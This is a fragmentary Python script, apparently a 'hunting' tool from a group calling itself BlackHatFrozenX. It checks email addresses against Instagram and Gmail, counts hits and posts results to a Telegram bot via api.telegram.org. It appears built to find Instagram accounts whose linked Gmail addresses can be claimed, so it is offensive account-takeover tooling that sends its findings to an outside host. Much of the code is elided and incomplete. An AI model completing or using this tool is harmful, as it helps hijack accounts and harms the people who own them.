...
def hunting(email):	
    ...
    'ig_sig_key_version': '4',
		...
		try:
			...
			name = None
		date = date_sc(Id)			
		requests.post(f"""https://api.telegram.org/bot{tok}/sendvideo?chat_id={iD}&parse_mode=MarkdownV2&video=https://t.me/FrozenPayout/68&caption=*•  𝙝𝙚𝙡𝙡 𝙞𝙨 𝙘𝙤𝙢𝙞𝙣𝙜 
...
𝐑𝐄𝐒𝐓 : : {}
┏━━━━━━━⍟
┃BY @BlackHatFrozenX / @princemodder
┗━━━━━━━━━━━⊛				
...
def check_email(email):
	...
	bo = f'\x1b[38;5;{b}m'
	check+=1
	sys.stdout.write(f"\r  — — — — — — — — — — — — — — —                                        {C}Good Gm : {F}{good_hot}                                                                                                          {C}Bad IG : {R}{bad_ig}                                                                                                             {C}Good IG : {X}{good_ig}                                                                                                           {C}{bo}Check•{check}                                                                                                              — — — — — — — — — — — — — — —\r")
	sys.stdout.flush()
